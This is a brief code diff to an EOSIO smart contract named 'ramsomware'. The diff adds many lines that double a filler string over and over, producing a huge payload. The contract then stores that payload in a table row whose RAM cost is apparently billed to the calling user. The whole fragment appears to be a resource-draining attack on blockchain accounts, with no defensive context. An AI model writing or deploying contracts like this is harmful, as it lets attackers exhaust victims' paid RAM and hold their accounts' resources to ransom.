@@ -23,6 +23,16 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
         {
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
 
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
